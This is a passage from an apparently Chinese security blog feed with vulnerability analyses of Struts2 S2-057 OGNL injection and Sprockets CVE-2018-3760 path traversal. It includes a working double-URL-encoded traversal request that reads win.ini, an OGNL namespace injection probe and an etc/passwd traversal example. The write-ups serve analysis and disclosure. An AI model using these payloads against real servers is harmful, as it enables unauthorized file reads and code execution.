<p>同一函数中继续执行 172行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    ...</div><div class="line"></div><div class="line">    String tmpLocation = actionMapper.getUriFromActionMapping(<span class="keyword">new</span> ActionMapping(actionName, namespace, method, <span class="keyword">null</span>));</div><div class="line"></div><div class="line">    setLocation(tmpLocation);</div><div class="line"></div><div class="line">    <span class="keyword">super</span>.execute(invocation);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>ActionMapping</code>生成如下，<code>this.namespace</code>值赋为<code>/${(111+111)}</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-6205e480-a69d-1.png" alt="9.png"></p>
<p>跟入<code>getUriFromActionMapping</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUriFromActionMapping</span><span class="params">(ActionMapping mapping)</span> </span>&#123;</div><div class="line">    StringBuilder uri = <span class="keyword">new</span> StringBuilder();</div><div class="line"></div><div class="line">    handleNamespace(mapping, uri);</div><div class="line">    handleName(mapping, uri);</div><div class="line">    handleDynamicMethod(mapping, uri);</div><div class="line">    handleExtension(mapping, uri);</div><div class="line">    handleParams(mapping, uri);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> uri.toString();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>handleNamespace</code>处理结果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-6216bbac-a69d-1.png" alt="10.png"></p>
<p>当函数返回，<code>tmpLocation</code>值为<code>/${(111+111)}/register2.action</code>，然后通过<code>setLocation(tmpLocation)</code>使得location变量值为<code>/${(111+111)}/register2.action</code>，从而最终造成OGNL注入。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-6233aa28-a69d-1.png" alt="8.png"></p>
<h2 id="攻击点二：-Action-chaining"><a href="#攻击点二：-Action-chaining" class="headerlink" title="攻击点二： Action chaining"></a>攻击点二： <a href="https://struts.apache.org/core-developers/action-chaining.html" target="_blank" rel="external">Action chaining</a></h2><p>apps/showcase/src/main/resources/struts-actionchaining.xml 中注意<code>&lt;result&gt;</code>标签中<code>&lt;type&gt;</code>为<code>chain</code>：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"chain"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-62464c5a-a69d-1.png" alt="17.png"></p>
<p>同样会先经过<code>result = createResult()</code>，然后调用<code>result.execute(this);</code>。这会进入到 com/opensymphony/xwork2/ActionChainResult.java:203<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    <span class="comment">// if the finalNamespace wasn't explicitly defined, assume the current one</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.namespace == <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">this</span>.namespace = invocation.getProxy().getNamespace();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ValueStack stack = ActionContext.getContext().getValueStack();</div><div class="line">    String finalNamespace = TextParseUtil.translateVariables(namespace, stack);</div><div class="line">    String finalActionName = TextParseUtil.translateVariables(actionName, stack);</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由于没有设定<code>namespace</code>，所以通过<code>invocation.getProxy().getNamespace()</code>使得<code>this.namespace</code>值为<code>/${(111+111)}</code>。然后调用了<code>String finalNamespace = TextParseUtil.translateVariables(namespace, stack);</code>对namespace进行OGNL解析。如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-6265f7b2-a69d-1.png" alt="11.png"></p>
<h2 id="攻击点三：Postback-result"><a href="#攻击点三：Postback-result" class="headerlink" title="攻击点三：Postback result"></a>攻击点三：<a href="https://struts.apache.org/core-developers/postback-result.html" target="_blank" rel="external">Postback result</a></h2><p>apps/showcase/src/main/resources/struts-actionchaining.xml 中注意<code>&lt;result&gt;</code>标签中<code>&lt;type&gt;</code>为<code>postback</code>：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"postback"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-627a9546-a69d-1.png" alt="16.png"><br>经过<code>result = createResult()</code>，跟入定位到<code>postback</code>这个result对象的处理方法，在 org/apache/struts2/result/PostbackResult.java:113<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    String postbackUri = makePostbackUri(invocation);</div><div class="line">    setLocation(postbackUri);</div><div class="line">    <span class="keyword">super</span>.execute(invocation);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>makePostbackUri1</code>，在org/apache/struts2/result/PostbackResult.java:129<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">makePostbackUri</span><span class="params">(ActionInvocation invocation)</span> </span>&#123;</div><div class="line">    ActionContext ctx = invocation.getInvocationContext();</div><div class="line">    HttpServletRequest request = (HttpServletRequest) ctx.get(ServletActionContext.HTTP_REQUEST);</div><div class="line">    String postbackUri;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (actionName != <span class="keyword">null</span>) &#123;</div><div class="line">        actionName = conditionalParse(actionName, invocation);</div><div class="line">        <span class="keyword">if</span> (namespace == <span class="keyword">null</span>) &#123;</div><div class="line">            namespace = invocation.getProxy().getNamespace();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            namespace = conditionalParse(namespace, invocation);</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">        postbackUri = request.getContextPath() + actionMapper.getUriFromActionMapping(<span class="keyword">new</span> ActionMapping(actionName, namespace, method, <span class="keyword">null</span>));</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">return</span> postbackUri;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-62a0f9e8-a69d-1.png" alt="12.png"></p>
<p>获取到<code>namespace</code>值为<code>/${(111+111)}</code>。跟入<code>actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null))</code>，其具体执行过程如攻击点一[Redirect action]提到的那样，设置namespace等参数，然后从<code>getUriFromActionMapping</code>中返回uri。最后组装的postbackUri为<code>/${(111+111)}/register2.action</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142553-62bd3748-a69d-1.png" alt="13.png"></p>
<p>回到前面的<code>execute</code>中通过<code>setLocation(postbackUri)</code>设置了location变量：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142553-62d8fff0-a69d-1.png" alt="14.png"></p>
<p>此后location变量传入，造成OGNL表达式注入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142553-62f34194-a69d-1.png" alt="15.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://struts.apache.org/core-developers/namespace-configuration.html" target="_blank" rel="external">https://struts.apache.org/core-developers/namespace-configuration.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2618&quot;&gt;【Struts2-代码执行漏洞分析系列】S2-057&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
    
      <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
    
  </entry>
  
  <entry>
    <title>Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】</title>
    <link href="http://chybeta.github.io/2018/08/20/Ruby-on-Rails-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-3760%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/08/20/Ruby-on-Rails-路径穿越与任意文件读取漏洞分析-【CVE-2018-3760】/</id>
    <published>2018-08-20T08:33:19.000Z</published>
    <updated>2018-08-20T08:35:01.841Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2542" target="_blank" rel="external">Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p>该漏洞由安全研究人员 <a href="https://twitter.com/orange_8361" target="_blank" rel="external">Orange Tsai</a>发现。漏洞公告来自  <a href="https://groups.google.com/forum/#!topic/rubyonrails-security/ft_J--l55fM" target="_blank" rel="external">https://groups.google.com/forum/#!topic/rubyonrails-security/ft_J--l55fM</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">There is an information leak vulnerability in Sprockets. This vulnerability</div><div class="line">has been assigned the CVE identifier CVE-2018-3760.</div><div class="line"></div><div class="line">Versions Affected: 4.0.0.beta7 and lower, 3.7.1 and lower, 2.12.4 and lower.</div><div class="line">Not affected: NONE</div><div class="line">Fixed Versions: 4.0.0.beta8, 3.7.2, 2.12.5</div><div class="line"></div><div class="line">Impact</div><div class="line">------</div><div class="line">Specially crafted requests can be used to access files that exists on</div><div class="line">the filesystem that is outside an application&apos;s root directory, when the Sprockets server is</div><div class="line">used in production.</div><div class="line"></div><div class="line">All users running an affected release should either upgrade or use one of the work arounds immediately.</div></pre></td></tr></table></figure></p>
<p>影响面： development servers，且开启了 <code>config.assets.compile</code></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>本地安装好ruby和rails。以ruby 2.4.4 ，rails v5.0.7为例：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ gem install rails -v <span class="number">5.0</span>.<span class="number">7</span></div><div class="line">$ rails new blog &amp;&amp; cd blog</div></pre></td></tr></table></figure></p>
<p>此时blog这个rails项目使用的sprockets版本是3.7.2（fixed）。修改blog目录下的Gemfile.lock第122行：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sprockets (<span class="number">3.7</span>.<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<p>修改配置文件 <code>config/environments/production.rb</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">config.assets.compile = true</div></pre></td></tr></table></figure></p>
<p>在blog目录下执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ bundle install</div><div class="line">$ rails server                                     </div><div class="line">    * Min threads: 5, max threads: 5                           </div><div class="line">    * Environment: development                                 </div><div class="line">    * Listening on tcp://0.0.0.0:3000                          </div><div class="line">    Use Ctrl-C to stop</div></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /assets/file:%2f%2f//C:/chybeta/blog/app/assets/config/%252e%252e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2fWindows/win.ini</div></pre></td></tr></table></figure></p>
<p>win平台：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f3b27b0-9ac3-1.png" alt="win.png"></p>
<p>linux平台</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f6242e6-9ac3-1.png" alt="linux.png"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>注：为明白起见，许多分析直接写在代码注释部分，请留意。</p>
<p>问题出在<code>sprockets</code>，它用来检查 JavaScript 文件的相互依赖关系，用以优化网页中引入的js文件，以避免加载不必要的js文件。当访问如<code>http://127.0.0.1:3000/assets/foo.js</code>时，会进入server.rb:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(env)</span></span></div><div class="line">    start_time = Time.now.to_f</div><div class="line">    time_elapsed = lambda &#123; ((Time.now.to_f - start_time) * <span class="number">1000</span>).to_i &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ![<span class="string">'GET'</span>, <span class="string">'HEAD'</span>].<span class="keyword">include</span>?(env[<span class="string">'REQUEST_METHOD'</span>])</div><div class="line">    <span class="keyword">return</span> method_not_allowed_response</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    msg = <span class="string">"Served asset <span class="subst">#&#123;env[<span class="string">'PATH_INFO'</span>]&#125;</span> -"</span></div><div class="line"></div><div class="line">    <span class="comment"># Extract the path from everything after the leading slash</span></div><div class="line">    path = Rack::Utils.unescape(env[<span class="string">'PATH_INFO'</span>].to_s.sub(<span class="regexp">/^\//</span>, <span class="string">''</span>))</div><div class="line"></div><div class="line">    <span class="comment"># Strip fingerprint</span></div><div class="line">    <span class="keyword">if</span> fingerprint = path_fingerprint(path)</div><div class="line">      path = path.sub(<span class="string">"-<span class="subst">#&#123;fingerprint&#125;</span>"</span>, <span class="string">''</span>)</div><div class="line">    <span class="keyword">end</span></div><div class="line">    <span class="comment"># 此时path值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line"></div><div class="line">    <span class="comment"># URLs containing a `".."` are rejected for security reasons.</span></div><div class="line">    <span class="keyword">if</span> forbidden_request?(path)</div><div class="line">        <span class="keyword">return</span> forbidden_response(env)</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    asset = find_asset(path, options)</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p><code>forbidden_request</code>用来对path进行检查，是否包含<code>..</code>以防止路径穿越，是否是绝对路径：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">private</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forbidden_request?</span><span class="params">(path)</span></span></div><div class="line">    <span class="comment"># Prevent access to files elsewhere on the file system</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment">#     http://example.org/assets/../../../etc/passwd</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    path.<span class="keyword">include</span>?(<span class="string">".."</span>) <span class="params">||</span> absolute_path?(path)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>如果请求中包含<code>..</code>即返回真，然后返回forbidden_response(env)信息。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f7cf082-9ac3-1.png" alt="4.png"></p>
<p>回到call函数，进入<code>find_asset(path, options)</code>，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/base.rb:63:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Find asset by logical path or expanded path.</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_asset</span><span class="params">(path, options = &#123;&#125;)</span></span></div><div class="line">    uri, <span class="number">_</span> = resolve(path, options.merge(<span class="symbol">compat:</span> <span class="literal">false</span>))</div><div class="line">    <span class="keyword">if</span> uri</div><div class="line">        <span class="comment"># 解析出来的 uri 值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">        load(uri)</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>跟进<code>load</code>，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/loader.rb:32 。以请求<code>GET /assets/file:%2f%2f//C:/chybeta/blog/app/assets/config/%252e%252e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2fWindows/win.ini</code>为例，其一步步的解析过程见下注释：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(uri)</span></span></div><div class="line">    <span class="comment"># 此时 uri 已经经过了一次的url解码 </span></div><div class="line">    <span class="comment"># 其值为  file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">    unloaded = UnloadedAsset.new(uri, <span class="keyword">self</span>)</div><div class="line">    <span class="keyword">if</span> unloaded.params.key?(<span class="symbol">:id</span>)</div><div class="line">        ...</div><div class="line">    <span class="keyword">else</span></div><div class="line">        asset = fetch_asset_from_dependency_cache(unloaded) <span class="keyword">do</span> <span class="params">|paths|</span></div><div class="line">        <span class="comment"># When asset is previously generated, its "dependencies" are stored in the cache.</span></div><div class="line">        <span class="comment"># The presence of `paths` indicates dependencies were stored.</span></div><div class="line">        <span class="comment"># We can check to see if the dependencies have not changed by "resolving" them and</span></div><div class="line">        <span class="comment"># generating a digest key from the resolved entries. If this digest key has not</span></div><div class="line">        <span class="comment"># changed the asset will be pulled from cache.</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="comment"># If this `paths` is present but the cache returns nothing then `fetch_asset_from_dependency_cache`</span></div><div class="line">        <span class="comment"># will confusingly be called again with `paths` set to nil where the asset will be</span></div><div class="line">        <span class="comment"># loaded from disk.</span></div><div class="line"></div><div class="line">        <span class="comment"># 当存在缓存时</span></div><div class="line">        <span class="keyword">if</span> paths</div><div class="line">            load_from_unloaded(unloaded)</div><div class="line">            digest = DigestUtils.digest(resolve_dependencies(paths))</div><div class="line">            <span class="keyword">if</span> uri_from_cache = cache.get(unloaded.digest_key(digest), <span class="literal">true</span>)</div><div class="line">                asset_from_cache(UnloadedAsset.new(uri_from_cache, <span class="keyword">self</span>).asset_key)</div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">        <span class="comment"># 当缓存不存在，主要考虑这个</span></div><div class="line">            load_from_unloaded(unloaded)</div><div class="line">        <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    Asset.new(<span class="keyword">self</span>, asset)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>跟入<code>UnloadedAsset.new</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnloadedAsset</span></span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(uri, env)</span></span></div><div class="line">      @uri               = uri.to_s</div><div class="line">      @env               = env</div><div class="line">      @compressed_path   = URITar.new(uri, env).compressed_path</div><div class="line">      @params            = <span class="literal">nil</span> <span class="comment"># lazy loaded</span></div><div class="line">      @filename          = <span class="literal">nil</span> <span class="comment"># lazy loaded 具体实现见下面</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    ...</div><div class="line">    <span class="comment"># Internal: Full file path without schema</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># This returns a string containing the full path to the asset without the schema.</span></div><div class="line">    <span class="comment"># Information is loaded lazilly since we want `UnloadedAsset.new(dep, self).relative_path`</span></div><div class="line">    <span class="comment"># to be fast. Calling this method the first time allocates an array and a hash.</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Example</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># If the URI is `file:///Full/path/app/assets/javascripts/application.js"` then the</span></div><div class="line">    <span class="comment"># filename would be `"/Full/path/app/assets/javascripts/application.js"`</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Returns a String.</span></div><div class="line"></div><div class="line">    <span class="comment"># 由于采用了Lazy loaded，当第一次访问到filename这个属性时，会调用下面这个方法</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filename</span></span></div><div class="line">      unless @filename</div><div class="line">        load_file_params <span class="comment"># 跟进去，见下</span></div><div class="line">      <span class="keyword">end</span></div><div class="line">      @filename</div><div class="line">    <span class="keyword">end</span></div><div class="line">    ...</div><div class="line">    <span class="comment"># 第 130 行</span></div><div class="line">    private</div><div class="line">    <span class="comment"># Internal: Parses uri into filename and params hash</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Returns Array with filename and params hash</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_file_params</span></span></div><div class="line">        <span class="comment"># uri 为  file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">        @filename, @params = URIUtils.parse_asset_uri(uri)</div><div class="line">    <span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>跟入<code>URIUtils.parse_asset_uri</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_asset_uri</span><span class="params">(uri)</span></span></div><div class="line">    <span class="comment"># uri 为  file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">    <span class="comment"># 跟进 split_file_uri</span></div><div class="line">    scheme, <span class="number">_</span>, path, query = split_file_uri(uri)</div><div class="line">    ...</div><div class="line">    <span class="keyword">return</span> path, parse_uri_query_params(query)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">...<span class="comment"># 省略</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_file_uri</span><span class="params">(uri)</span></span></div><div class="line">    scheme, <span class="number">_</span>, host, <span class="number">_</span>, <span class="number">_</span>, path, <span class="number">_</span>, query, <span class="number">_</span> = URI.split(uri)</div><div class="line">    <span class="comment"># 此时解析出的几个变量如下： </span></div><div class="line">    <span class="comment"># scheme: file</span></div><div class="line">    <span class="comment"># host: </span></div><div class="line">    <span class="comment"># path: /C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">    <span class="comment"># query:  </span></div><div class="line">    path = URI::Generic::DEFAULT_PARSER.unescape(path)</div><div class="line">    <span class="comment"># 这里经过第二次的url解码</span></div><div class="line">    <span class="comment"># path：/C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini</span></div><div class="line">    path.force_encoding(Encoding::UTF_8)</div><div class="line"></div><div class="line">    <span class="comment"># Hack for parsing Windows "file:///C:/Users/IEUser" paths</span></div><div class="line">    path.gsub!(<span class="regexp">/^\/([a-zA-Z]:)/</span>, <span class="string">'\1'</span>.freeze)</div><div class="line">    <span class="comment"># path: C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini</span></div><div class="line">    [scheme, host, path, query]</div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="string">``</span><span class="string">`    </span></div><div class="line"></div><div class="line"></div><div class="line">![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f8e0bce-9ac3-1.png)</div><div class="line"></div><div 